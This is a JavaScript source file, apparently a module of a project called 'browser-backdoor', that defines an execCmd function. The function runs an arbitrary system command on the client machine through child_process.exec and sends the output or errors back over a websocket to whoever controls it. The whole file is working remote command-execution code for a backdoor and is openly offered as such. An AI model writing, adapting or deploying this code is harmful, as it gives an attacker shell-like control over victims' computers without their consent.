// INTERACTIVE
/**
 * @file execCmd Module
 * @summary Executes an arbitrary system command on the client system.
 * @author Carleton Stuberg
 * @see https://github.com/IMcPwn/browser-backdoor
 * @license MIT
 * @version 0.1
 */

exec = require('child_process').exec;

/**
 * @param {String} cmd - The command to execute.
 * @return {String} |error|
 * @return {String} $stdout
 * @return {String} $stderr
 */
execCmd = function (cmd) {
    exec(cmd, function (err, stdout, stderr) {
        if (err) {
            ws.send("Error executing command: " + err.toString());
        } else {
            ws.send('stdout: ' + stdout);
            ws.send('stderr: ' + stderr);
        }
    });
}

ws.send("\nUsage: execCmd(cmd)\n- cmd is the command to be executed.");
